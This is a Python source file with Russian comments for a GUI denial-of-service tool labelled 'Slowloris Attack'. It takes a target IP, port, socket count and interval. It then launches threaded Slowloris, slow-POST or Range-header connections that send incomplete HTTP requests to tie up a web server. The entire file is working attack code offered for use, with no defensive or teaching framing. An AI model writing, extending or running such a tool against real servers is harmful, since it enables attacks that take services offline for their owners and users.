import customtkinter as ctk
import socket
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# Очистка фрейма от всех виджетов
def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

# Функция для обновления текстового поля в безопасном режиме
def update_text_box(text_box, message):
    """Функция для безопасного обновления текстового поля из потока"""
    text_box.after(0, lambda: text_box.insert("end", message + "\n"))
    text_box.after(0, lambda: text_box.yview("end"))  # Прокручиваем вниз

# Функция для отображения UI
def slowloris_ui(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)  # Очистить перед созданием UI

    # Заголовок
    title = ctk.CTkLabel(parent_frame, text="Slowloris Attack 💀", font=("Arial", 24))
    title.place(relx=0.5, rely=0.1, anchor="center")

    # Поле ввода для IP-адреса
    ip_label = ctk.CTkLabel(parent_frame, text="IP Address:", font=("Arial", 16))
    ip_label.place(relx=0.3, rely=0.3, anchor="center")
    ip_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    ip_entry.place(relx=0.7, rely=0.3, anchor="center")

    # Поле ввода для порта
    port_label = ctk.CTkLabel(parent_frame, text="Port:", font=("Arial", 16))
    port_label.place(relx=0.3, rely=0.4, anchor="center")
    port_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    port_entry.place(relx=0.7, rely=0.4, anchor="center")

    # Поле ввода для количества сокетов
    sockets_label = ctk.CTkLabel(parent_frame, text="Sockets:", font=("Arial", 16))
    sockets_label.place(relx=0.3, rely=0.5, anchor="center")
    sockets_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    sockets_entry.place(relx=0.7, rely=0.5, anchor="center")

    # Поле ввода для интервала
    interval_label = ctk.CTkLabel(parent_frame, text="Interval (sec):", font=("Arial", 16))
    interval_label.place(relx=0.3, rely=0.6, anchor="center")
    interval_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    interval_entry.place(relx=0.7, rely=0.6, anchor="center")

    # Поле выбора метода атаки
    method_atack_label = ctk.CTkLabel(parent_frame, text="Method of attack:", font=("Arial", 16))
    method_atack_label.place(relx=0.3, rely=0.7, anchor="center")
    method_atack = ctk.CTkComboBox(parent_frame, values=["Slowloris", "Slowpost", "Range"], font=("Arial", 16), width=200)
    method_atack.place(relx=0.7, rely=0.7, anchor="center")

    # Кнопка запуска атаки
    start_btn = ctk.CTkButton(
        parent_frame, 
        text="Start Attack", 
        fg_color="black", 
        border_color="#8d33ff", 
        hover_color="#2a104c", 
        border_width=2, 
        font=("Arial", 16), 
        command=lambda: start_attack(ip_entry.get(), port_entry.get(), sockets_entry.get(), interval_entry.get(), parent_frame, method_atack.get()), 
        width=parent_frame.winfo_width() * 0.7, 
        height=40
    )
    start_btn.place(relx=0.5, rely=0.8, anchor="center")

    # Textbox для вывода результатов
    # text_box = ctk.CTkTextbox(parent_frame, width=parent_frame.winfo_width() * 0.7, height=70, font=("Arial", 12))
    # text_box.place(relx=0.5, rely=0.85, anchor="center")

# Функции для атак
def slowloris_attack(sock, target):
    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
    sock.send(f"Host: {target}\r\n".encode())
    sock.send("User-Agent: slowloris-test\r\n".encode())
    sock.send("Content-Length: 10000\r\n".encode())

def slowpost_attack(sock, target):
    sock.send(f"POST / HTTP/1.1\r\n".encode())
    sock.send(f"Host: {target}\r\n".encode())
    sock.send("User-Agent: slowpost-test\r\n".encode())
    sock.send("Content-Length: 10000\r\n\r\n".encode())

def range_attack(sock, target):
    sock.send(f"GET / HTTP/1.1\r\n".encode())
    sock.send(f"Host: {target}\r\n".encode())
    sock.send("User-Agent: range-test\r\n".encode())
    sock.send("Range: bytes=0-0\r\n\r\n".encode())

# Запуск атаки с выбранным методом
def start_attack(target, port, sockets, interval, parent_frame, attack_method):
    try:
        target = str(target)
        port = int(port)
        sockets = int(sockets)
        interval = int(interval)

        #update_text_box(parent_frame.winfo_children()[-1], f"[~] Атака на {target}:{port} с {sockets} сокетами через {interval} секунд")

        # Выбор метода атаки
        attack_functions = {
            "Slowloris": slowloris_socket,
            "Slowpost": slowpost_socket,
            "Range": range_socket
        }

        attack_function = attack_functions.get(attack_method, slowloris_socket)

        # Используем ThreadPoolExecutor для эффективного управления потоками
        with ThreadPoolExecutor(max_workers=sockets) as executor:
            for _ in range(sockets):
                executor.submit(attack_function, target, port, interval, parent_frame)

    except Exception as e:
        pass
        #update_text_box(parent_frame.winfo_children()[-1], f"[!] Ошибка: {e}")

# Основная логика для сокетов (атакующие потоки)
def slowloris_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] Подключено: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] Ошибка: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] Соединение закрыто, перезапуск")

def slowpost_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] Подключено: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"POST / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] Ошибка: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] Соединение закрыто, перезапуск")

def range_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] Подключено: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Range: bytes=0-0\r\n\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] Ошибка: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] Соединение закрыто, перезапуск")